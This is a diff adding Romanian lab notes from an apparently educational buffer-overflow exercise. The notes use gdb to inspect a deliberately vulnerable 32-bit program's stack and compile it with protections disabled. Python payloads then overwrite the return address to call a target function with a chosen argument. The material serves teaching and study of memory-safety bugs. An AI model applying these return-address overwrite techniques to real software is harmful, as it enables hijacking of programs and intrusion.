@@ -1,0 +1,71 @@
+1.
+gdb buffovf
+break main
+run AAA
+s sau n pana ajung la copy
+
+2.
+s - intru in copy
+break
+i b
+delete 1
+continue
+run AAA
+print name $1 = "\000\340\373\367e\235\343\367\242VUV"
+print &name $2 = void
+n
+n
+print name $3 = "A\000\340\373\367e\235\343\367\242VUV"
+print &name $4 = (char (*)[12]) 0xffffd594
+
+3.
+pe alt terminal: 
+gdb
+show disable-randomization -> Disabling randomization of debuggee's virtual address space is on.
+print $buf $5 = "0xffffd4ec"
+
+--
+face ca adresele sa fie random la fiecare sesiune de debugging
+ideea e sa fie usor de facut debug daca e blocat
+pe laptopurile noastre este intotdeauna on
+
+4.
+gdb buffovf
+break main
+run AAA
+s
+s
+n
+info frame
+ebp: 0xffffd5a8
+return addrs ebp-4: 0xffffd5ac
+first local var ebp+8: 0xffffd5b0
+
+5.
+ar trb minim 16 pt sigsegv
+
+6.
+gcc buffovf.c -o buffovf -fno-stack-protector -m32 -g -fno-pic -no-pie
+objdump -d -M intel buffovf
+adresa lui wanted : 0x080484b6
+run A < <(python -c 'print("A" * 24 + "\xB6\x84\x04\x08")')
+
+7.
+run A < <(python -c 'print("A" * 24 + "\xB6\x84\x04\x08" + "A" * 4 + "\xbe\xba\xfe\xca")')
+
+8.
+run A < <(python -c 'print("A" * 24 + "\xB6\x84\x04\x08" + "\x70\x83\x04\x08" + "\xbe\xba\xfe\xca")') -> da exit clar
+run A < <(python -c 'print("A" * 24 + "\xB6\x84\x04\x08" + "\x7f\x85\x04\x08" + "\xbe\xba\xfe\xca")') -> return in main dupa copy()
+
+
+
+
+
+
+
+
+
+
+
+
+
